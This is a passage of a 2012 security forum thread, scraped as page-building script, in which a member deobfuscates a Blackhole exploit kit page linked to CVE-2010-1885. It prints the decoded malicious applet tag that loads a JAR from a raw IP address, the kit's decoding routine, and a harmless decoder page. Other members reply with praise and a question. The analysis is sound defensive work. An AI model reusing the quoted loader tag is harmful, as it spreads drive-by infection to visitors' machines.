<b>CVE-2010-1885</b><br />\r\n<br />\r\nI have put almost all the details there to deobfuscate it so I am not covering them once again here.<br />\r\n<br />\r\nWe will look at the first malicious JS sent in the HTTP Response and deobfuscate it.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_7664" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_7664" class="newreply" href="newreply.php?do=newreply&amp;p=7664" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7664" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[7665] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_7665">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">04-30-2012,&nbsp;<span class="time">11:42 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post7665" href="showthread.php?t=2250&amp;p=7665&amp;viewfull=1#post7665" class="postcounter">#3</a><a id="postcount7665" name="3"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=311" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=311" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="c0d3inj3cT is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_7665_311" title="c0d3inj3cT will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>67</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=311">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_7665">\r\n						<blockquote class="postcontent restore ">\r\n							A snippet of the first few lines from the malicious HTML:<br />\n<br />\n<img src="http://garage4hackers.com/attachment.php?attachmentid=348&amp;d=1335764847" border="0" alt="Name:  bcukL.jpg\r\nViews: 1166\r\nSize:  19.9 KB"  style="float: CONFIG" /><br />\n<br />\nThe applet tag has the various attributes like, code, archive, cod HTML encoded.<br />\n<br />\nDecoding this, we get:<br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:60px;">&lt;applet/*/ code=&quot;ya.M&quot; cod=&quot;cod&quot; archive=http://69.194.192.229/Klot.jar&gt;\n&lt;param name=p valu=&quot;google&quot; value=L::9#NmmQ11Q3qx61wNNL::9Nmmdcxfcgxfc&amp;x&amp;&amp;cm5x9L92tS_&amp;g%IeqSJ/&gt;\n&lt;/applet&gt;</pre>\r\n</div>The steps:<br />\n<br />\n<ul><li style="">It fetches the Klot.jar archive from <a href="http://69.194.192.229/Klot.jar" target="_blank">http://69.194.192.229/Klot.jar</a></li><li style="">It invokes the init method of the ya.M class</li><li style="">It also passes a parameter with the name p and a value &quot;L::9#NmmQ11Q3qx61wNNL::9Nmmdcxfcgxfc&amp;x&amp;&amp;cm5x9L92t  S_&amp;g%IeqSJ&quot;</li><li style="">This value will be retrieved in the applet using the getParameter() method.</li></ul><br />\n<br />\nBy looking at the parameter value we can see that there is some kind of decoding logic present inside the Klot.jar archive file.<br />\n<br />\nNow, let\'s focus on the malicious JS:<br />\n<br />\nAfter taking a look at the complete obfuscated JS, we notice that there are multiple &lt;div/&gt; elements in the web page. I have shown a few below:<br />\n<br />\n<img src="http://garage4hackers.com/attachment.php?attachmentid=352&amp;d=1335765744" border="0" alt="Name:  htDDo.jpg\r\nViews: 1184\r\nSize:  20.3 KB"  style="float: CONFIG" /><br />\n<br />\n<img src="http://garage4hackers.com/attachment.php?attachmentid=353&amp;d=1335765766" border="0" alt="Name:  wVnht.jpg\r\nViews: 1156\r\nSize:  20.8 KB"  style="float: CONFIG" /><br />\n<br />\n<img src="http://garage4hackers.com/attachment.php?attachmentid=354&amp;d=1335765787" border="0" alt="Name:  3Vjxr.jpg\r\nViews: 1169\r\nSize:  19.5 KB"  style="float: CONFIG" /><br />\n<br />\nObservations:<br />\n<br />\nThe innerHTML between these &lt;div/&gt; elements is obfuscated.<br />\nThe first 3 characters following the &lt;div&gt; elements are the same, &quot;$$$&quot;. As we will see later, the obfuscated JS will get rid of these characters.<br />\n<br />\nLocating the obfuscated JS:<br />\n<br />\nOpen the malicious HTML in any text editor. I use, notepad. Go to the starting of the document. Find the text, &quot;&lt;/div&gt;&quot; using Find Feature.<br />\n<br />\nKeep looking for it till you reach the end of last &lt;div&gt; element.<br />\n<br />\nOnce you do, it will look like below:<br />\n<br />\n<img src="http://garage4hackers.com/attachment.php?attachmentid=355&amp;d=1335766312" border="0" alt="Name:  dQAue.jpg\r\nViews: 1160\r\nSize:  20.3 KB"  style="float: CONFIG" /><br />\n<br />\nNow, we are at the starting of the obfuscated JS.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n						<div class="attachments">\r\n\r\n						\r\n\r\n						\r\n							<fieldset class="postcontent">\r\n								<legend><img src="images/misc/paperclip.png" class="inlineimg" alt="Attached Images" /> Attached Images</legend>\r\n								<img class="attach" src="attachment.php?attachmentid=349&amp;stc=1&amp;d=1335765561" alt="" />&nbsp;<img class="attach" src="attachment.php?attachmentid=350&amp;stc=1&amp;d=1335765590" alt="" />&nbsp;<img class="attach" src="attachment.php?attachmentid=351&amp;stc=1&amp;d=1335765617" alt="" />&nbsp;\r\n							</fieldset>\r\n						\r\n\r\n						\r\n\r\n						\r\n\r\n						\r\n\r\n						</div>\r\n					<!-' + '- / attachments -' + '->\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				<!-' + '- edit note -' + '->\r\n				<blockquote class="postcontent lastedited">\r\n					\r\n						Last edited by c0d3inj3cT; 04-30-2012 at <span class="time">01:06 PM</span>.\r\n					\r\n					\r\n				</blockquote>\r\n				<!-' + '- / edit note -' + '->\r\n				\r\n				\r\n				\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_7665" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_7665" class="newreply" href="newreply.php?do=newreply&amp;p=7665" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7665" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[7666] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_7666">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">04-30-2012,&nbsp;<span class="time">12:22 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post7666" href="showthread.php?t=2250&amp;p=7666&amp;viewfull=1#post7666" class="postcounter">#4</a><a id="postcount7666" name="4"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=311" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=311" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="c0d3inj3cT is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_7666_311" title="c0d3inj3cT will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>67</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=311">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_7666">\r\n						<blockquote class="postcontent restore ">\r\n							Using the steps mentioned in my paper, you can deobfuscate this JS and get the following code:<br />\n<br />\nI have added the necessary comments wherever needed.<br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:372px;">&lt;script&gt;\n\ndd=document.getElementsByTagName(&quot;div&quot;); // returns the collection of &lt;div&gt; elements in dd\n\n// variable initializations\n\nzz=window;\np=&quot;prototype&quot;;\ne=&quot;eval&quot;;\nfr=&quot;fromCharCode&quot;;\nch=&quot;charCodeAt&quot;;\nr=&quot;replace&quot;;\nst=String.fromCharCode;\n\nfor(i=0;i&lt;dd[&quot;length&quot;];i++)\n{\n	\n	m(dd[i].innerHTML.substr(3)); // strip off first 3 invalid characters from innerHTML of &lt;div&gt; elements\n}\n\n// substitute &amp;lt; with &lt;, &amp;gt; with &gt;, &amp;amp; with &amp;\n\nz=z.replace(/&amp;lt;/g,&quot;&lt;&quot;); \nz=z.replace(/&amp;gt;/g,&quot;&gt;&quot;);\nz=z.replace(/&amp;amp;/g,&quot;&amp;&quot;);\n\ne(&quot;md=\'a\'&quot;);\ns=&quot;&quot;;\n\nfor(i=0;i&lt;=15961;i++) \n{\n	if(i==15961)\n	{\n		q=s;  // store the deobfuscated result in q\n		e(q); // this will eval the result\n	}\n	else\n	{\n		c=z.substr(i,1); // pick one char at a time from the obfuscated HTML\n		h=c.charCodeAt(0); // retrieve the ASCII value and store it in h\n		if((h&gt;=36)&amp;&amp;(h&lt;61)) // check if the ASCII value falls in the range (36, 61)\n		{\n		c=String.fromCharCode(h+25); // Add 25 to ASCII value and convert to Character\n		} \n		else if ((h&gt;=61)&amp;&amp;(h&lt;86))  // check if the ASCII value falls within the range, (61, 86)\n		{\n		c=String.fromCharCode(-25+h); // Subtract 25 from the ASCII value and convert to Character\n		}\n		s=s.concat(c);\n	}\n}\n&lt;/script&gt;</pre>\r\n</div>There is one more JS chunk at the starting of the malicious HTML. This will receive the innerHTML of &lt;div&gt; elements and concatenate them into the String variable, z. <br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:108px;">&lt;script&gt;\nm=function(q)\n{\nz=z+q; // concatenate the innerHTML and store result in z\n};\nz=new String();\n&lt;/script&gt;</pre>\r\n</div>Putting all this together, I construct a New HTML page which will deobfuscate the first layer:<br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:372px;">&lt;html&gt;\n&lt;title&gt; c0d3inj3cT in BlackHole&lt;/title&gt;\n&lt;script&gt;\nm=function(q){z+=q;};\nz=new String();\n&lt;/script&gt;\n&lt;div&gt;..... The Obfuscated innerHTML comes here&lt;/div&gt;\n\n&lt;script&gt;\n\nzz=window;\n\ndd=document.getElementsByTagName(\'div\');\n\n\nfor(i=0;i&lt;dd[&quot;length&quot;];i++)\n{\n	\n	m(dd[i].innerHTML.substr(3));\n}\n\nz=z.replace(/&amp;lt;/g,&quot;&lt;&quot;);\nz=z.replace(/&amp;gt;/g,&quot;&gt;&quot;);\nz=z.replace(/&amp;amp;/g,&quot;&amp;&quot;);\n\ns1=&quot;&quot;;\n\nfor(i=0;i&lt;10000;i++) \n{\n		c=z.substr(i,1);\n		h=c.charCodeAt(0);\n		if((h&gt;=36)&amp;&amp;(h&lt;61))\n		{\n		c=String.fromCharCode(h+25);\n		} \n		else if ((h&gt;=61)&amp;&amp;(h&lt;86)) \n		{\n		c=String.fromCharCode(-25+h);\n		}\n		s1=s1.concat(c);\n}\n\ns2=&quot;&quot;;\nfor(i=10000;i&lt;15961;i++) \n{\n		c=z.substr(i,1);\n		h=c.charCodeAt(0);\n		if((h&gt;=36)&amp;&amp;(h&lt;61))\n		{\n		c=String.fromCharCode(h+25);\n		} \n		else if ((h&gt;=61)&amp;&amp;(h&lt;86)) \n		{\n		c=String.fromCharCode(-25+h);\n		}\n		s2=s2.concat(c);\n}\n\nalert(s1);\nalert(s2);\n\n&lt;/script&gt;\n&lt;/html&gt;</pre>\r\n</div>Save this as an HTML Page and open it with your Browser. The variables s1 and s2 hold the result, so I have done an alert on them.<br />\n<br />\n<img src="http://garage4hackers.com/attachment.php?attachmentid=356&amp;d=1335768666" border="0" alt="Name:  t8vi3.jpg\r\nViews: 1156\r\nSize:  20.4 KB"  style="float: CONFIG" /><br />\n<br />\n<b>Note:</b> I have modified the code a bit. The length of the entire obfuscated code is 15961 characters. However, the maximum number of characters which can be displayed by JavaScript alert function are 10000.<br />\n<br />\nSo, we might get incomplete deobfuscated code if we just alert the resulting variable s.<br />\n<br />\nInstead, I have created two variables, s1 and s2. Run the FOR loop for appropriate lengths and then alert both the variables one after another.<br />\n<br />\nYou can save the values of both the variables s1 and s2 in another HTML page. This way, you get the complete deobfuscated layer 1 code.<br />\n<br />\nThere are other ways to do it as well. You can use whichever method you want but need to be careful about handling the length of the obfuscated code keeping in mind the JavaScript restrictions.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				<!-' + '- edit note -' + '->\r\n				<blockquote class="postcontent lastedited">\r\n					\r\n						Last edited by c0d3inj3cT; 04-30-2012 at <span class="time">05:43 PM</span>.\r\n					\r\n					\r\n				</blockquote>\r\n				<!-' + '- / edit note -' + '->\r\n				\r\n				\r\n				\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_7666" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_7666" class="newreply" href="newreply.php?do=newreply&amp;p=7666" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7666" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[7674] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_7674">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">05-02-2012,&nbsp;<span class="time">06:49 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post7674" href="showthread.php?t=2250&amp;p=7674&amp;viewfull=1#post7674" class="postcounter">#5</a><a id="postcount7674" name="5"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=8" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=8" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://Garage4Hackers.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="fb1h2s is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_7674_8" title="fb1h2s has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=8" title="fb1h2s is offline">\r\n				<img src="image.php?u=8&amp;dateline=1400680840" alt="fb1h2s\'s Avatar" title="fb1h2s\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>616</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=8">32</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_7674">\r\n						<blockquote class="postcontent restore ">\r\n							Cool stuff buddy, any idea wht version of the kit u analyzed ??\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">Hacking Is a Matter of Time Knowledge and Patience</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_7674" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_7674" class="newreply" href="newreply.php?do=newreply&amp;p=7674" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7674" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[7814] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_7814">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">05-22-2012,&nbsp;<span class="time">05:34 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post7814" href="showthread.php?t=2250&amp;p=7814&amp;viewfull=1#post7814" class="postcounter">#6</a><a id="postcount7814" name="6"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=18" title="prashant_uniyal is offline"><strong>prashant_uniyal</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=18" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=18&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=18" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=18" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://hackingethics.wordpress.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/18-prashant_uniyal" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="prashant_uniyal is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Analyst\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_7814_18" title="prashant_uniyal has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=18" title="prashant_uniyal is offline">\r\n				<img src="image.php?u=18&amp;dateline=1393305256" alt="prashant_uniyal\'s Avatar" title="prashant_uniyal\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>localhost</dd>\r\n					\r\n					<dt>Posts</dt> <dd>505</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=18">8</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_7814">\r\n						<blockquote class="postcontent restore ">\r\n							Nice and in depth analysis! Thanks for posting such a useful work <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer"><i><b>The three great essentials to achieve anything worth while are: Hard work, Stick-to-itiveness, and Common sense.</b></i> - <b>Thomas A. Edison</b><br />\r\n__________________________________________________  _____________________</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_7814" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_7814" class="newreply" href="newreply.php?do=newreply&amp;p=7814" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7814" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[8048] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_8048">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">06-20-2012,&nbsp;<span class="time">04:15 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post8048" href="showthread.php?t=2250&amp;p=8048&amp;viewfull=1#post8048" class="postcounter">#7</a><a id="postcount8048" name="7"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=61" class="siteicon_profile">\r\n				View 